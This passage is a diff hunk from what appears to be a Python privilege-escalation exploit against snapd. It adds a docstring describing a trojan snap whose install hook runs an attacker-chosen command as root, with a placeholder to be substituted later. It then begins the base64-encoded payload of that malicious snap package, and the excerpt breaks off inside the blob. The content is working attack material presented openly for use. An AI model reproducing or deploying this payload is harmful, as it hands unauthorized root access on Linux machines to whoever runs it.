@@ -22,6 +22,14 @@ __author__ = "D3fa1t"
 
 APPEND_COMMENT = " #"
 SLEEP = 5   # in sec
+
+'''
+TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
+and if the exploit is successful, then the cmd is run as root 
+
+`BQUF` is a place holder which would later be replace by the cmd that needs to be run as root
+'''
+
 TROJAN_BASE_SNAP = ('''
 aHNxcwcAAACe5/ZcAAACAAEAAAABABEA6wEBAAQAAADYAAAAAAAAAEQHAAAAAAAAPAcAAAAAAAD/
 /////////0EFAAAAAAAAOwYAAAAAAADsBgAAAAAAAC4HAAAAAAAAIyEvYmluL2Jhc2gKCnRvdWNo
